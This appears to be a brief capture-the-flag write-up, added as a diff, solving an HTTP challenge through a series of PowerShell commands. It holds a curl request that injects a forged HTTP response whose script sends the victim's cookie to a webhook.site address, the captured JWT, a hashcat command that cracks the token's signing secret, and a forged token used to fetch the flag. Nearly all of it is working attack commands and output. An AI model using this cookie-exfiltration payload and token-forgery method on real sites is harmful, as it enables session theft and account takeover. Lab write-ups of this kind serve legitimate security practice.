@@ -1,0 +1,12 @@
+Basically, use `\n` instead of `\r\n` and add a dummy `\r\n\r\n` at the end.
+
+PS> curl -X POST --data-binary "body=HTTP/1.1 200 OK`nContent-Type: text/html; charset=UTF-8`n`n<!DOCTYPE html><html><head><script>fetch(``https://webhook.site/b61ca3aa-72ed-41d2-95b3-ee023ed5ded8?cookie=`${encodeURIComponent(document.cookie)}``)</script></head></html>`r`n`r`n" https://v1-learn-http.ctf.pearlctf.in/check
+https://webhook.site/b61ca3aa-72ed-41d2-95b3-ee023ed5ded8?cookie=token%3DeyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzA5OTI1Nzk1fQ.YROTJzBKWIY4nVzFy9rlp9np-NKUsmL0P0ubhFdERLc
+token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzA5OTgxNzY0fQ.Cd7gBNUtVLXkIXLdtUbCVAyFLZnM98_j4_px-u3azfQ
+
+PS> ./hashcat.exe --backend-ignore-opencl -m 16500 -t 32 -a 3 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzA5OTgxNzY0fQ.Cd7gBNUtVLXkIXLdtUbCVAyFLZnM98_j4_px-u3azfQ
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiaWF0IjoxNzA5OTgxNzY0fQ.Cd7gBNUtVLXkIXLdtUbCVAyFLZnM98_j4_px-u3azfQ:password
+
+PS> curl --cookie "token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNzA5OTgxNzY0fQ.Cr5Ywzswx-LUWuzScYWMietrEavEhMNbjbrT8P59gIQ" https://v1-learn-http.ctf.pearlctf.in/flag
+> token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNzA5OTgxNzY0fQ.Cr5Ywzswx-LUWuzScYWMietrEavEhMNbjbrT8P59gIQ
+pearl{w0w_7hat_w4s_0ut_Of_th3_boX}
